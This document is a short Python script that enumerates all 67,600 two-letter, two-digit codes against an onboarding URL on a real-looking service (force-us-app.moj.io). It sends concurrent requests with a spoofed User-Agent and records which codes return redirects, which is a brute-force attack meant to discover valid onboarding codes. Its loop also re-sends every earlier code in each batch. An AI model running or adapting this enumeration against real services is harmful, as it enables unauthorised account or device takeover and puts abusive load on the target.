import string
import grequests
import requests
import sys


L = []
for L1 in string.ascii_uppercase:
    for L2 in string.ascii_uppercase:
        L.append(L1+L2)

I = []
for I1 in '0123456789':
    for I2 in '0123456789':
        I.append(I1+I2)

C = []
for L1 in L:
    for I1 in I:
        C.append(L1+I1)

start = 0
limit = 100
while limit < 67600:
    print(limit)
    results = grequests.map((grequests.get('https://force-us-app.moj.io/onboard/' + C1, headers={'User-Agent':'toto'}) for C1 in C[:limit]), size=100)
    for r in results:
        with open("result.txt", "a") as f:
            f.write(r.request.path_url + ' - ' + str(r.status_code))
            if r.status_code == 302:
                print(r.headers['Location'])
                f.write(r.headers['Location'])

    start = limit
    limit = limit + 100